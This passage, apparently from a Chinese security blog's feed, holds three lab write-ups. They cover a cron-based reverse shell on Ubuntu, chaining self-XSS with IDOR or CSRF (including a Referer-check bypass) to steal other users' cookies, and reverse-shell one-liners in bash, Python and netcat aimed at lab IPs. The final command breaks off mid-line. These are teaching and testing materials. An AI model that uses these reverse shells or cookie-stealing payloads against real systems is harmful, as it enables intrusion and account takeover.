class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180817/C1IEiF0k24.png?imageslim" alt="mark"><br><strong>需要特别注意的一点是这的root文件的权限必须为600，也就是<code>rw-------</code>，否则会出现<code>cron[53948]: (root) INSECURE MODE (mode 0600 expected)</code>的错误，会影响到后面的实验</strong></p><p><strong>但是kali却迟迟接收不到反弹过来的shell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180817/Li4blLb61B.png?imageslim" alt="mark"><br><strong>之前在centos上利用的时候并没有出现这种情况，使用ubuntu的时候居然不行，下面我们就来一步步的排查看看到底是什么原因导致的</strong></p><p><strong>首先，咱们先来看一下系统日志</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tail -f /var/<span class="built_in">log</span>/syslog</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180817/211iak03He.png?imageslim" alt="mark"><br><strong>通过系统日志可以看到<code>CRON[55318]: (CRON) info (No MTA installed, discarding output)</code>这一条，我们之所以反弹shell失败，和这句话有着很大的关系，百度了一番后得到这句话的大概意思就是我们任务计划里的命令执行如果出现了错误，ubuntu会将这些错误信息去输出到ubuntu系统的邮件服务器，但是由于ubuntu系统默认没有安装邮件服务器，所以才导致了上面的错误</strong></p><p><strong>通过了上面的信息，可以推断出我们任务计划中的命令执行出现了某种错误，然后ubuntu处理这种错误方式是将错误信息发送到本地的邮件服务器，但是邮件服务器不存在，那么我们要想办法将错误信息重定向到文件里面去看看究竟是命令的什么地方产生了错误，修改任务计划文件为</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * <span class="string">'/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1'</span>&gt;/tmp/error.txt 2&gt;&amp;1</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/7cHCBagDi3.png?imageslim" alt="mark"><br><strong>1代表标准输出。2代表标准错误输出，也就是命令执行出现的错误，这里将<code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1</code>执行的标准错误输出重定向到输出流，也就是<code>/tmp/error.txt</code>这个文件中，而不是邮件服务器，然后再看日志就没有刚刚的错误了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cHI0CEilb8.png?imageslim" alt="mark"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/sh: 1: /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1: not found</div></pre></td></tr></table></figure><p><strong>下面可以看到<code>tmp</code>目录下新生成了一个记录错误信息的文件error.txt,内容如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/224m4lc376.png?imageslim" alt="mark"><br><strong>这条错误的意思说<code>/bin/bash</code>没有被找到，通过错误信息还可以明白一件事情，那就是linux里面的cron中command执行的shell环境是<code>/bin/sh</code>，那我们可以再来看一下ubuntu下的<code>/bin/sh</code>文件究极是一个怎么样的文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls -al /bin/sh</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/mBK26LkHI7.png?imageslim" alt="mark"><br><strong>可以看到<code>/bin/sh</code>其实是一个软连接文件(l),类似于windows中的快捷方式，只不过在ubuntu中，<code>/bin/sh</code>这个软连接指向了<code>dash</code>，而我们反弹shell使用的shell环境是<code>bash</code>，所以这一点是反弹出错的根本原因</strong></p><p><strong>那么之前的centos为什么就能成功，下面来看一下centos里面的<code>/bin/sh</code>的指向</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/D6b21a44ml.png?imageslim" alt="mark"><br><strong>可以看到centos中<code>/bin/sh</code>的指向是bash，所以命令执行不会出错</strong></p><p><strong>在这里说一下bash和dash的区别，bash是具有交互能力的shell，而dash不具有交互能力，只是具有运行脚本的能力的shell</strong></p><p><strong>搞清楚了根本的原因后，来说一下解决的办法，这里有两种解决办法，其中一种解决办法是通过修改ubuntu中<code>/bin/sh</code>的指向，将dash改为bash即可，命令如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s -f bash /bin/sh</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cGhdh4gbmF.png?imageslim" alt="mark"><br><strong>可以看到此时<code>/bin/sh</code>以及指向了<code>bash</code>，此时将任务计划里的文件修改为之前反弹shell的命令，可以看到不会再报错了，并且shell成功反弹到了kali上</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/Jhm2mgDdhi.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cChIDHhm8m.png?imageslim" alt="mark"></p><p><strong>下面来说一下第二种解决办法，首先我们先将<code>/bin/sh</code>的指向改回<code>dash</code></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s -f dash /bin/sh</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/6kcc9EHIEj.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/Kcal0c0Be3.png?imageslim" alt="mark"><br><strong>下面来说一下第二种方法，就是避免在cron文件里去使用bash这个具有交互能力的shell，我们可以另外的去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用运行这个shell脚本文件即可</strong></p><p><strong>shell脚本文件如下，文件名为<code>/tmp/test.sh</code></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.107/7777 0&gt;&amp;1</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/HHkFmi68jB.png?imageslim" alt="mark"><br><strong>然后为test.sh加上执行权限</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x /tmp/test.sh</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/hDGaFg6CFG.png?imageslim" alt="mark"><br><strong>之后任务计划里的内容修改为</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * /tmp/test.sh</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/fB8kK61H0B.png?imageslim" alt="mark"><br><strong>由于现在cron的shell环境为dash，所以具有可以直接运行<code>/tmp/test.sh</code>这个脚本文件的能力，所以执行了test.sh里面这条反弹shell的命令，现在便可以看到kali上成功反弹到了shell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cfi3KGBI0d.png?imageslim" alt="mark"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>这一次真的是踩了很多坑，最终才终于弄明白，通过这次的学习使我对linux的认识更加的深刻了，同时也学到了解决问题的思路和方法，在这里十分感谢kakaxi和ttgo2两位大神的帮助！</strong></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><strong><a href="https://www.365yg.com/i6590668394092036612#mid=1568076190183425" target="_blank" rel="external">视频详解（来自kakaxi和ttgo2两位师傅）</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;解决ubuntu任务计划写shell失败的问题&quot;&gt;&lt;a href=&quot;#解决ubuntu任务计划写shell失败的问题&quot; class=&quot;headerlink&quot; title=&quot;解决ubuntu任务计划写shell失败的问题&quot;&gt;&lt;/a&gt;解决ubuntu任务计划写shell失败的问题&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这个问题的由来是因为自己在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题，结果因为这个问题卡了很久，最终在kakaxi和ttgo2两位大佬的指导和帮助下才解决了该问题，将整个问题的解决过程在这里记录一下~&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux渗透" scheme="http://yoursite.com/categories/Linux%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘中的脑洞大开---使用漏洞组合拳扩大漏洞危害</title>
    <link href="http://yoursite.com/2018/08/08/%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88/"/>
    <id>http://yoursite.com/2018/08/08/漏洞组合/</id>
    <published>2018-08-08T04:26:51.455Z</published>
    <updated>2018-08-08T05:26:34.621Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害"><a href="#漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害" class="headerlink" title="漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害"></a>漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害</h1><p><strong>这篇文章给大家分享一下我在漏洞挖掘中对一些漏洞组合拳的利用方法，相信大家在漏洞挖掘中都遇到过这样一个问题，比如我发现了一个存储型xss，但是只是鸡肋的selfxss，只能自己看到才能触发、又或者是单单的csrf、或者没有实质危害的越权漏洞等，就算提交了也只能算低危，如果小伙伴们在漏洞挖掘中遇到了这些问题，那么这篇文章或许可以帮到各位一些，下面我通过我挖掘到的两个利用漏洞组合拳的方式，分享一下如何将低危漏洞变的有价值</strong><br><a id="more"></a></p><h3 id="组合拳一式：selfxss-水平越权漏洞"><a href="#组合拳一式：selfxss-水平越权漏洞" class="headerlink" title="组合拳一式：selfxss+水平越权漏洞"></a>组合拳一式：selfxss+水平越权漏洞</h3><p><strong>虽然只是一个selfxss，但是结合水平越权添加的话，可以向其他用户个人中心添加xss payload，从而使该目标网站的目标用户去触发该xss漏洞，将js恶意代码在其浏览器执行</strong></p><p><strong>举个栗子：</strong><br><strong>用户中心设置信息的地方没有对xss过滤导致存在存储型xss漏洞，尝试新增常用联系人，在详细地址的位置插入xss的payload</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/2h2EHIHFCF.png?imageslim" alt="mark"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/8mLLkI6508.png?imageslim" alt="mark"><br><strong>但是此处有可能只是一个selfxss，如果只是能打到自己的cookie，那么这个存储型xss就会显得很鸡肋。但是这个网站存在一个越权添加个人信息的漏洞，越权的漏洞之前也提交过一次，在添加的时候通过修改user_id可以越权将信息添加到其它用户里，在这里可以利用越权漏洞将xsspayload插入其他用户的个人中心里去扩大这个selfxss的危害,简单来说就是利用越权添加和selfxss的组合拳增加这个selfxss的危害，这样就可以打到其他用户的cookie</strong></p><p><strong>还是之前测试越权的两个账号</strong></p><pre><code>用户名：格鲁特   用户id：112054用户名：火箭    用户id：112069</code></pre><p><strong>首先在格鲁特的个人中心中添加常用联系人，之前说了在详细地址处存在存储型xss，这里插入加载远程js的xsspayload，同时使用xss平台接收信息</strong></p><p><strong>xsspayload：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script src=xss平台上的远程脚本&gt;&lt;/script&gt;</div></pre></td></tr></table></figure><p><strong>之后抓包，数据包里有个参数为user_id，这个参数可控，导致可以越权</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/8DCH9k5D1l.png?imageslim" alt="mark"><br><strong>修改数据包中的user_id,尝试将此条包含xsspayload的信息越权添加到其他用户的个人信息中，如果成功，那么其他用户在登陆后查看时就会触发xss代码加载远程脚本，将用户的cookie打到我们的xss平台上，这里将user_id改为火箭用户的id（112069）</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/7A8I50Gb0d.png?imageslim" alt="mark"><br><strong>可以看到添加成功，但是在当前的账号上看不到刚刚添加的信息</strong></p><p><strong>然后使用火箭账号登陆，可以看到包含xsspayload的信息是否已经被越权添加到火箭用户的常用信息中,可以看到火箭用户在登陆后查看联系人信息时我们的xss平台就能接收到火箭用户的cookie</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/6D023iAEL1.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/EcL0eeimml.png?imageslim" alt="mark"><br><strong>接下来将获取到的火箭用户的cookie替换为格鲁特用户的cookie，可以看到成功登陆到了火箭的账号</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/EB6Lga9LI4.png?imageslim" alt="mark"><br><strong>而且user_id只有6位数，是可以遍历的，如果遍历了所有的uid，那么就可以打到所有用户的cookie，所以漏洞的危害还是非常大的，所以通过selfxss+水平越权两个低危漏洞组合就可以变成一个影响严重的高危漏洞</strong></p><h3 id="组合拳二式：selfxss-csrf"><a href="#组合拳二式：selfxss-csrf" class="headerlink" title="组合拳二式：selfxss+csrf"></a>组合拳二式：selfxss+csrf</h3><p><strong>selfxss危害不够，只能自己弹自己？遇到这样的低危漏洞千万不要放过它，结合一下csrf，会有想不到的效果</strong></p><p><strong>举个栗子：</strong><br><strong>在个人中心签名处，经过测试发现存在存储型xss，虽然网站将alert替换为了空，但是只替换了一次，所以通过构造payload：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">" onmouseover="</span>alalertert(<span class="number">1</span>)</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/GDEJ7AIDfd.png?imageslim" alt="mark"><br><strong>提交完签名后刷新页面后发现可以弹框</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/2f8EGAj4Ib.png?imageslim" alt="mark"><br><strong>但是貌似这个只能自己看到，因为不确定管理员能否看到自己的签名，所以如果只是一个self的存储型xss的话，危害可能并不会那么大</strong></p><p><strong>别急，咱们继续往下看，既然是提交签名的话，一定会发送一次http请求的，所以猜测这一点可能存在csrf，经过测试确实是存在的，但是该网站对csrf是有防御的，因为发送请求时带上了referer头，并且服务端对referer头做了检查，经过一番fuzz后发现referer头里面只要有该网站的域名就可以绕过服务端对csrf的限制</strong></p><p><strong>于是想到了一个思路，那就是在自己服务器上创建一个名为”该网站域名.html”的页面,这样的话http请求中的referer里面就会有该网站域名，从而可以绕过对csrf的过滤，页面通过ajax发送一次提交签名的请求，参数为我们构造的xss代码，然后诱使已经登陆该网站的用户使用同一浏览器去访问我服务器上的页面，使该用户在不知情的情况下去更改自己的签名，将签名更改为xss的代码，我们就可以通过js去控制他的浏览器了</strong><br><strong>为了看到效果，我们先把签名给改回来</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/80leiHAfcH.png?imageslim" alt="mark"></p><p><strong>之后模拟受害者使用同一浏览器去访问我服务器的页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/67KH2cmDAk.png?imageslim" alt="mark"><br><strong>可以看到用户在不知情的情况下发送了一次提交签名的请求，完成了这次的跨站请求伪造，然后再看一下个人中心，可以看到xss代码已经成功写入到受害者的个人签名</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180808/bE0bfEB6ch.png?imageslim" alt="mark"></p><p><strong>可以看到通过selfxss+csrf漏洞的组合拳可以产生巨大的危害，比如我们可以通过csrf将盗取用户cookie的xss代码写入到受害者中心，或者控制浏览器跳转任意页面等，不过签名在服务端限制了只能为30个字符，但是如果加载比较短的域名应该还是可以的</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>这是我在漏洞挖掘中遇到的两个比较有意义的组合利用，总之，在漏洞挖掘中，遇到低危漏洞时，不要急着提交，先看看有没有可以扩大其危害的漏洞，可以尝试组合一下，我相信类似的问题或者脑洞还有不少，以后自己遇到了还会去总结。各位师傅们有什么好的思路的话，欢迎补充~~</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害&quot;&gt;&lt;a href=&quot;#漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害&quot; class=&quot;headerlink&quot; title=&quot;漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害&quot;&gt;&lt;/a&gt;漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这篇文章给大家分享一下我在漏洞挖掘中对一些漏洞组合拳的利用方法，相信大家在漏洞挖掘中都遇到过这样一个问题，比如我发现了一个存储型xss，但是只是鸡肋的selfxss，只能自己看到才能触发、又或者是单单的csrf、或者没有实质危害的越权漏洞等，就算提交了也只能算低危，如果小伙伴们在漏洞挖掘中遇到了这些问题，那么这篇文章或许可以帮到各位一些，下面我通过我挖掘到的两个利用漏洞组合拳的方式，分享一下如何将低危漏洞变的有价值&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="漏洞挖掘" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
      <category term="漏洞挖掘" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Linux下几种反弹shell方法的总结与理解</title>
    <link href="http://yoursite.com/2018/07/17/linuxshell/"/>
    <id>http://yoursite.com/2018/07/17/linuxshell/</id>
    <published>2018-07-17T03:55:32.487Z</published>
    <updated>2018-07-18T07:31:30.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux下几种反弹shell方法的总结与理解"><a href="#Linux下几种反弹shell方法的总结与理解" class="headerlink" title="Linux下几种反弹shell方法的总结与理解"></a>Linux下几种反弹shell方法的总结与理解</h1><p><strong>之前在网上看到很多师傅们总结的linux反弹shell的一些方法，为了更熟练的去运用这些技术，于是自己花精力查了很多资料去理解这些命令的含义，将研究的成果记录在这里，所谓的反弹shell，指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，下面来介绍分析几种常用的方法</strong><br><a id="more"></a></p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p><strong>CentOS 6.5：192.168.0.3</strong></p><p><strong>kali2.0：192.168.0.4</strong></p><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p><strong>反弹shell命令如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</div></pre></td></tr></table></figure><p><strong>首先，使用nc在kali上监听端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvp 7777</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180717/0DdE723LF1.png?imageslim" alt="mark"><br><strong>然后在CentOS6.5下输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180717/B9l36f21h6.png?imageslim" alt="mark"><br><strong>可以看到shell成功反弹到了kali上面，可以执行命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180717/35JfJKF24L.png?imageslim" alt="mark"><br><strong>在解释这条反弹shell的命令原理之前，首先需要掌握几个点</strong></p><p><strong>linux文件描述符：linux shell下有三种标准的文件描述符，分别如下</strong></p><pre><code>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;1 - stdout 代表标准输出,使用&gt;或&gt;&gt;2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</code></pre><p><strong>还有就是&gt;&amp;这个符号的含义，最好的理解是这样的</strong></p><pre><code>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</code></pre><p><strong>也有师傅把&amp;这个符号解释为是取地址符号，学过C语言的小伙伴们都知道&amp;这个符号代表取地址符，在C++中&amp;符号还代表为引用，这样做是为了区分文件描述符和文件，比如查看一个不存在的文件，要把标准错误重定向到标准输出，如果直接<code>cat notexistfile 2&gt;1</code>的话，则会将1看作是一个文件，将标准错误输出输出到1这个文件里而不是标准输出,而&amp;的作用就是为了区分文件和文件描述符</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180717/9gLL6Ih539.png?imageslim" alt="mark"><br><strong>理解了上面这些知识，下面来解释一下这一条反弹shell的命令</strong></p><p><strong>首先，<code>bash -i</code>代表在本地打开一个bash，然后就是<code>/dev/tcp/ip/port</code>， <code>/dev/tcp/</code>是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上<code>/dev/tcp/ip/port</code>这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在本机CentOS输入命令，输出以及错误输出的内容就会被传递显示到远程</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180717/jA18Hi8L77.png?imageslim" alt="mark"><br><strong>在本地输入设备（键盘）输入命令，在本地看不到输入的内容，但是键盘输入的命令已经被输出到了远程，然后命令的执行结果或者错误也会被传到远程，查看远程，可以看到标准输出和标准错误输出都重定向到了远程</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180717/0g2Im6dj72.png?imageslim" alt="mark"><br><strong>下面在该命令后面加上<code>0&gt;&amp;1</code>，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了<code>/dev/tcp/ip/port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180717/Ad1dIgeg9K.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180717/iHaH464C61.png?imageslim" alt="mark"><br><strong>那么，0&gt;&amp;2也是可以的，代表将标准输入重定向到标准错误输出，而标准错误输出重定向到了<code>/dev/tcp/ip/port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180717/AeA8baLFEc.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180717/32KC81aH0J.png?imageslim" alt="mark"><br><strong>为了更形象的理解，下面给出了整个过程的数据流向，首先是本地的输入输出流向</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/I9E4l0E31l.png?imageslim" alt="mark"></p><p><strong>执行<code>bash -i &gt;&amp; /dev/tcp/ip/port</code>后</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/F38m9Hlg48.png?imageslim" alt="mark"></p><p><strong>执行<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>或者<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;2</code>后</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/iG2h7i1g7D.png?imageslim" alt="mark"></p><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p><strong>使用python反弹，反弹shell命令如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span></div></pre></td></tr></table></figure><p><strong>首先，使用nc在kali上监听端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvp 7777</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/H2IlCDa6j2.png?imageslim" alt="mark"><br><strong>在CentOS下使用python去反向连接，输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.4',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span></div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/e7kde87mKE.png?imageslim" alt="mark"><br><strong>可以看到kali上成功反弹到了shell，可以执行一些命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/Ek7JD4eGeh.png?imageslim" alt="mark"><br><strong>在已经深入理解了第一种方法的原理后，下面来解释一下python反弹shell的原理</strong></p><p><strong>首先使用socket与远程建立起连接，接下来使用到了os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，dup2这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，在这里可以把fd1和fd2看作是C语言里的指针，将fd1赋值给fd2，就相当于将fd2指向于s.fileno()，fileno()返回的是一个文件描述符，在这里也就是建立socket连接返回的文件描述符，经过测试可以看到值为3</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/C2adcJcjIh.png?imageslim" alt="mark"></p><p><strong>于是这样就相当于将标准输入(0)、标准输出(1)、标准错误输出(2)重定向到远程(3)，接下来使用os的subprocess在本地开启一个子进程，传入参数“-i”使bash以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了远程，这样的话就可以在远程执行输入命令了</strong></p><h3 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h3><p><strong>使用nc反弹shell,需要的条件是被反弹shell的机器安装了nc，CentOS6.5安装nc方法如下</strong></p><pre><code>1、下载安装wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/downloadtar -zxvf netcat-0.7.1.tar.gz -C /usr/localcd /usr/localmv netcat-0.7.1 netcatcd /usr/local/netcat./configuremake &amp;&amp; make install2、配置vim /etc/profile添加以下内容：# set  netcat pathexport NETCAT_HOME=/usr/local/netcatexport PATH=$PATH:$NETCAT_HOME/bin保存，退出，并使配置生效：source /etc/profile3、测试nc -help成功</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/L3k8cCbd4I.png?imageslim" alt="mark"></p><p><strong>之后在kali上使用nc监听端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvp 7777</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/4JlKI8AAa8.png?imageslim" alt="mark"></p><p><strong>在CentOS上使用nc去反向连接，命令如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/bash 192.168.0.4 7777</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/lk26I81B39.png?imageslim" alt="mark"><br><strong>这里的-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(<code>/bin/bash</code>)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/G0j42BbeEI.png?imageslim" alt="mark"><br><strong>注意之前使用nc监听端口反弹shell时都会有一个警告：<code>Warning: forward host lookup failed for bogon: Unknown host</code>,根据nc帮助文档的提示加上-n参数就可以不产生这个警告了，-n参数代表在建立连接之前不对主机进行dns解析</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nlvp 7777</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/bDJ9Ah33Lj.png?imageslim" alt="mark"></p><p><strong>如果nc不支持-e参数的话，可以利用到linux中的管道符，首先在kali上开启监听</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 6666</div><div class="line">nc -nvlp 7777</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180718/6Gf87b2g0c.png?imageslim" alt="mark"><br><strong>之后在CentOS上使用nc去反向链接</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 192.168.0.4 6666|/bin/bash|192.168.0.4 